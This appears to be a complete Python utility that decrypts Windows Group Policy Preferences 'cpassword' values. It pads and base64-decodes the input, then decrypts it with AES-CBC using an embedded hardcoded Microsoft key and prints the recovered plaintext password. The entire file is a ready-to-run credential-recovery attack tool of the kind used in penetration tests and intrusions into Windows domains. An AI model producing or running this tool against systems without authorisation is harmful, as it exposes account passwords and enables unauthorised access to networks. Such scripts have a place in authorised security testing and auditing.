import sys
import base64
from Crypto.Cipher import AES #pip install pycryptodome!

if len(sys.argv) != 2:
    print("Usage: python3 password_found")
    sys.exit()

cpassword = sys.argv[1]

while len(cpassword) % 4 > 0: #Add needed padding for base 64 encoding
    cpassword += "="

decoded_password = base64.b64decode(cpassword)

# Microsoft Hardcoded key for decrypting the GPO hash.
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

decryption_suite = AES.new(key, AES.MODE_CBC, b'\00'*16)
plain_text = decryption_suite.decrypt(decoded_password)

print("Password is: {}".format(str(plain_text.strip().decode("utf-8"))))